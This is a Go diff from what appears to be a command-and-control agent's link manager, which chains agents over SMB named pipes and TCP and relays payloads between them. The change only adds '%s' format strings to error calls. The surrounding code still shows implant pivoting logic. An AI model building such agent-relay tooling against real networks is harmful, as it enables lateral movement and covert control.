@@ -197,20 +197,20 @@ func (lm *RMgr) link(pipePath string, creds *RA) (string, error) {
 	// Check if already linked to this pipe
 	if existingRoute, exists := lm.pipeToRoute[pipePath]; exists {
 		if link, ok := lm.links[existingRoute]; ok && link.IsActive {
-			return "", fmt.Errorf(Err(E5))
+			return "", fmt.Errorf("%s", Err(E5))
 		}
 	}
 
 	// Connect to the named pipe via SMB with credentials
 	conn, err := connectToPipe(pipePath, creds)
 	if err != nil {
-		return "", fmt.Errorf(ErrCtx(E12, err.Error()))
+		return "", fmt.Errorf("%s", ErrCtx(E12, err.Error()))
 	}
 
 	// Perform lightweight authentication with the SMB agent
 	if err := performLinkAuth(conn); err != nil {
 		conn.Close()
-		return "", fmt.Errorf(ErrCtx(E3, err.Error()))
+		return "", fmt.Errorf("%s", ErrCtx(E3, err.Error()))
 	}
 
 	// Generate routing ID
@@ -242,7 +242,7 @@ func (lm *RMgr) link(pipePath string, creds *RA) (string, error) {
 		conn.Close()
 		delete(lm.links, routingID)
 		delete(lm.pipeToRoute, pipePath)
-		return "", fmt.Errorf(ErrCtx(E10, err.Error()))
+		return "", fmt.Errorf("%s", ErrCtx(E10, err.Error()))
 	}
 
 	// Parse handshake message
@@ -288,20 +288,20 @@ func (lm *RMgr) linkTCP(address string) (string, error) {
 	// Check if already linked to this address
 	if existingRoute, exists := lm.addressToRoute[address]; exists {
 		if link, ok := lm.links[existingRoute]; ok && link.IsActive {
-			return "", fmt.Errorf(Err(E5))
+			return "", fmt.Errorf("%s", Err(E5))
 		}
 	}
 
 	// Connect via TCP
 	conn, err := dialTCP(address, 30*time.Second)
 	if err != nil {
-		return "", fmt.Errorf(ErrCtx(E12, err.Error()))
+		return "", fmt.Errorf("%s", ErrCtx(E12, err.Error()))
 	}
 
 	// Perform HMAC-based authentication with the TCP agent
 	if err := performLinkAuthTCP(conn); err != nil {
 		conn.Close()
-		return "", fmt.Errorf(ErrCtx(E3, err.Error()))
+		return "", fmt.Errorf("%s", ErrCtx(E3, err.Error()))
 	}
 
 	// Generate routing ID
@@ -336,7 +336,7 @@ func (lm *RMgr) unlink(routingID string) error {
 
 	link, exists := lm.links[routingID]
 	if !exists {
-		return fmt.Errorf(Err(E4))
+		return fmt.Errorf("%s", Err(E4))
 	}
 
 	// Send graceful disconnect message
@@ -408,14 +408,14 @@ func (lm *RMgr) getActiveLinks() []*RPeer {
 func (lm *RMgr) forwardToLinkedAgent(routingID string, payload string) error {
 	link, exists := lm.getLink(routingID)
 	if !exists {
-		return fmt.Errorf(Err(E4))
+		return fmt.Errorf("%s", Err(E4))
 	}
 
 	link.mu.Lock()
 	defer link.mu.Unlock()
 
 	if link.Conn == nil || !link.IsActive {
-		return fmt.Errorf(Err(E4))
+		return fmt.Errorf("%s", Err(E4))
 	}
 
 	// Send the payload over TCP
@@ -425,7 +425,7 @@ func (lm *RMgr) forwardToLinkedAgent(routingID string, payload string) error {
 
 	data, err := json.Marshal(message)
 	if err != nil {
-		return fmt.Errorf(ErrCtx(E18, err.Error()))
+		return fmt.Errorf("%s", ErrCtx(E18, err.Error()))
 	}
 
 	// Write with timeout using goroutine (SetWriteDeadline doesn't work with go-smb2)
@@ -439,11 +439,11 @@ func (lm *RMgr) forwardToLinkedAgent(routingID string, payload string) error {
 	case err := <-done:
 		if err != nil {
 			link.IsActive = false
-			return fmt.Errorf(ErrCtx(E11, err.Error()))
+			return fmt.Errorf("%s", ErrCtx(E11, err.Error()))
 		}
 	case <-time.After(10 * time.Second):
 		link.IsActive = false
-		return fmt.Errorf(Err(E9)) // Timeout error
+		return fmt.Errorf("%s", Err(E9)) // Timeout error
 	}
 
 	link.LastSeen = time.Now()
@@ -454,14 +454,14 @@ func (lm *RMgr) forwardToLinkedAgent(routingID string, payload string) error {
 func (lm *RMgr) forwardToLinkedAgentRaw(routingID string, data []byte, prepend, appendLen int) error {
 	link, exists := lm.getLink(routingID)
 	if !exists {
-		return fmt.Errorf(Err(E4))
+		return fmt.Errorf("%s", Err(E4))
 	}
 
 	link.mu.Lock()
 	defer link.mu.Unlock()
 
 	if link.Conn == nil || !link.IsActive {
-		return fmt.Errorf(Err(E4))
+		return fmt.Errorf("%s", Err(E4))
 	}
 
 	// Store transform lengths for response handling
@@ -479,11 +479,11 @@ func (lm *RMgr) forwardToLinkedAgentRaw(routingID string, data []byte, prepend, 
 	case err := <-done:
 		if err != nil {
 			link.IsActive = false
-			return fmt.Errorf(ErrCtx(E11, err.Error()))
+			return fmt.Errorf("%s", ErrCtx(E11, err.Error()))
 		}
 	case <-time.After(10 * time.Second):
 		link.IsActive = false
-		return fmt.Errorf(Err(E9)) // Timeout error
+		return fmt.Errorf("%s", Err(E9)) // Timeout error
 	}
 
 	link.LastSeen = time.Now()
@@ -494,7 +494,7 @@ func (lm *RMgr) forwardToLinkedAgentRaw(routingID string, data []byte, prepend, 
 func (lm *RMgr) forwardToLinkedAgentAndWait(routingID string, payload string, timeout time.Duration) (*ROut, error) {
 	link, exists := lm.getLink(routingID)
 	if !exists {
-		return nil, fmt.Errorf(Err(E4))
+		return nil, fmt.Errorf("%s", Err(E4))
 	}
 
 	// For SMB links, use synchronous request-response pattern
@@ -538,7 +538,7 @@ func (lm *RMgr) forwardToSMBAgentAndWait(link *RPeer, payload string, timeout ti
 	defer link.mu.Unlock()
 
 	if link.Conn == nil || !link.IsActive {
-		return nil, fmt.Errorf(Err(E4))
+		return nil, fmt.Errorf("%s", Err(E4))
 	}
 
 	// Create the command message
@@ -548,20 +548,20 @@ func (lm *RMgr) forwardToSMBAgentAndWait(link *RPeer, payload string, timeout ti
 
 	data, err := json.Marshal(message)
 	if err != nil {
-		return nil, fmt.Errorf(ErrCtx(E18, err.Error()))
+		return nil, fmt.Errorf("%s", ErrCtx(E18, err.Error()))
 	}
 
 	// Write the command with timeout
 	if err := lm.writeWithTimeout(link.Conn, data, timeout); err != nil {
 		link.IsActive = false
-		return nil, fmt.Errorf(ErrCtx(E11, err.Error()))
+		return nil, fmt.Errorf("%s", ErrCtx(E11, err.Error()))
 	}
 
 	// Read the response with timeout
 	respData, err := lm.readWithTimeout(link.Conn, timeout)
 	if err != nil {
 		link.IsActive = false
-		return nil, fmt.Errorf(ErrCtx(E10, err.Error()))
+		return nil, fmt.Errorf("%s", ErrCtx(E10, err.Error()))
 	}
 
 	link.LastSeen = time.Now()
@@ -589,13 +589,13 @@ func (lm *RMgr) forwardToSMBAgentAndWait(link *RPeer, payload string, timeout ti
 func (lm *RMgr) forwardToLinkedAgentRawAndWait(routingID string, payload string, prependLen, appendLen int, timeout time.Duration) (*ROut, error) {
 	link, exists := lm.getLink(routingID)
 	if !exists {
-		return nil, fmt.Errorf(Err(E4))
+		return nil, fmt.Errorf("%s", Err(E4))
 	}
 
 	// Decode base64 payload
 	rawData, err := base64.StdEncoding.DecodeString(payload)
 	if err != nil {
-		return nil, fmt.Errorf(ErrCtx(E18, err.Error()))
+		return nil, fmt.Errorf("%s", ErrCtx(E18, err.Error()))
 	}
 
 	// For SMB links, use synchronous request-response pattern
@@ -636,7 +636,7 @@ func (lm *RMgr) forwardToSMBAgentRawAndWait(link *RPeer, rawData []byte, prepend
 	defer link.mu.Unlock()
 
 	if link.Conn == nil || !link.IsActive {
-		return nil, fmt.Errorf(Err(E4))
+		return nil, fmt.Errorf("%s", Err(E4))
 	}
 
 	// Store transform lengths for response handling
@@ -646,14 +646,14 @@ func (lm *RMgr) forwardToSMBAgentRawAndWait(link *RPeer, rawData []byte, prepend
 	// Write raw bytes directly with timeout
 	if err := lm.writeWithTimeout(link.Conn, rawData, timeout); err != nil {
 		link.IsActive = false
-		return nil, fmt.Errorf(ErrCtx(E11, err.Error()))
+		return nil, fmt.Errorf("%s", ErrCtx(E11, err.Error()))
 	}
 
 	// Read the response with timeout
 	respData, err := lm.readWithTimeout(link.Conn, timeout)
 	if err != nil {
 		link.IsActive = false
-		return nil, fmt.Errorf(ErrCtx(E10, err.Error()))
+		return nil, fmt.Errorf("%s", ErrCtx(E10, err.Error()))
 	}
 
 	link.LastSeen = time.Now()
@@ -861,7 +861,7 @@ func (lm *RMgr) readWithTimeout(conn net.Conn, timeout time.Duration) ([]byte, e
 	case err := <-errChan:
 		return nil, err
 	case <-time.After(timeout):
-		return nil, fmt.Errorf(Err(E9)) // Timeout
+		return nil, fmt.Errorf("%s", Err(E9)) // Timeout
 	}
 }
 
@@ -878,7 +878,7 @@ func (lm *RMgr) writeWithTimeout(conn net.Conn, data []byte, timeout time.Durati
 	case err := <-done:
 		return err
 	case <-time.After(timeout):
-		return fmt.Errorf(Err(E9)) // Timeout
+		return fmt.Errorf("%s", Err(E9)) // Timeout
 	}
 }
 
@@ -949,7 +949,7 @@ func readMessage(conn net.Conn) ([]byte, error) {
 
 	// Sanity check
 	if length > 10*1024*1024 { // 10MB max
-		return nil, fmt.Errorf(Err(E2))
+		return nil, fmt.Errorf("%s", Err(E2))
 	}
 
 	// Read data using io.ReadFull
@@ -1000,7 +1000,7 @@ func (lm *RMgr) sendPing(link *RPeer) error {
 	defer link.mu.Unlock()
 
 	if link.Conn == nil || !link.IsActive {
-		return fmt.Errorf(Err(E4))
+		return fmt.Errorf("%s", Err(E4))
 	}
 
 	message := map[string]string{}
